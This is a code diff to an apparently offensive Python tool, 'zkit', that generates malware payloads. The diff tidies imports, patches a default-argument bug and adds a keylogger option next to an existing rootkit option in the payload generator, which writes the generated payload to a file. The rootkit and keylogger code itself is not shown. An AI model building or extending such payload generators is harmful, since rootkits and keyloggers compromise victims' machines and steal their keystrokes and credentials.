@@ -7,8 +7,7 @@ from __future__ import print_function, division, absolute_import
 import os
 import random
 from base64 import b85encode as be
-from core.helper_core._banners import banner1, banner2
-from core.helper_core import get_rootkit
+
 def init():
     'init the zkit . without you will get several errors'
     path_ = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
@@ -99,7 +98,7 @@ def ask_for(message: str, report: str, default=None, type=str, args=()): # pylin
         value = type(input(""))
     elif type == list:
         value = str(input("")).split()
-
+    default = ['', ''] if default is None else default
     if value == default[0]:
         if callable(default[1]):
             if args == ("DEFAULT"):
@@ -158,9 +157,13 @@ def create_file(file: str):
 
 
 def generate(payload_type):
+    from core.helper_core.rootkit import get_rootkit
+    from core.helper_core.keylogger import get_keylogger
     "generates payloads with given payload_type"
     if payload_type == "rootkit":
         payload, path = get_rootkit()
+    elif payload_type == "keylogger":
+        payload, path = get_keylogger()
     notify("notify", "Opening File To Write Data On It...", "")
     try:
         file = open(path, "w+")
@@ -198,6 +201,7 @@ def generate(payload_type):
 
 
 def print_banner():
+    from core.helper_core.banners import banner1, banner2
     "gets a random color and a random banner and prints it"
     _, red, green, _, blue, magenta, cyan, _, reset = Color().GetAllColors()
     random.seed(random.choice(
